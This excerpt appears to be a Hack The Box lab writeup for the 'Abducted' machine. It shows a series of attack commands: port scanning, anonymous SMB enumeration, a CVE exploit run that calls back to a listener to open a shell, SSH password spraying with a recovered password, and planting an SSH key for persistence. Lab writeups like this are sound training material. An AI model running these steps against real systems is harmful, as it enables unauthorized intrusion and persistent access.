...
- smb
- cve-2026-4480
image: /assets/img/posts/abducted/cover.png
difficulty: Medium
categories:
- Writeups
- Hack The Box
author: tr3m0x
permalink: /blog/writeups/htb/abducted/
...
```bash
tr3m0x@ubuntu:~/htb/linux/Abducted$ sudo nmap -p- --min-rate 1000 -T4 -oN scans/ports.nmap 10.129.43.224
...
```bash
tr3m0x@ubuntu:~/htb/linux/Abducted$ nxc smb abducted.htb -u '' -p '' --shares
...
```bash
tr3m0x@ubuntu:~/htb/linux/Abducted$ smbclient //10.129.43.224/projects -N
tree connect failed: NT_STATUS_ACCESS_DENIED
tr3m0x@ubuntu:~/htb/linux/Abducted$ smbclient //10.129.43.224/transfer -N
tree connect failed: NT_STATUS_ACCESS_DENIED
```
...
```bash
tr3m0x@ubuntu:~/htb/linux/Abducted$ smbclient //10.129.43.224/HP-Reception -N
...
```bash
tr3m0x@ubuntu:~/htb/linux/Abducted$ smbclient -L //10.129.43.224 -N
...
```bash
tr3m0x@ubuntu:~/htb/linux/Abducted$ python3 CVE-2026-4480.py -t 10.129.43.224 -l 10.10.14.18 -p 4444
...
```bash
tr3m0x@ubuntu:~/htb/linux/Abducted$ listen
...
```bash
tr3m0x@ubuntu:~/htb/linux/Abducted$ nxc ssh abducted.htb -u users.txt -p iXzvcib3SrpZ
...
```
```bash
tr3m0x@ubuntu:~/htb/linux/Abducted$ ssh-keygen -t ed25519 -N "" -f ./id_marcus
tr3m0x@ubuntu:~/htb/linux/Abducted$ echo "ssh-ed25519 [REDACTED] tr3m0x@ubuntu" >> authorized_keys
```
...
```bash
tr3m0x@ubuntu:~/htb/linux/Abducted$ ssh marcus@abducted.htb -i id_marcus
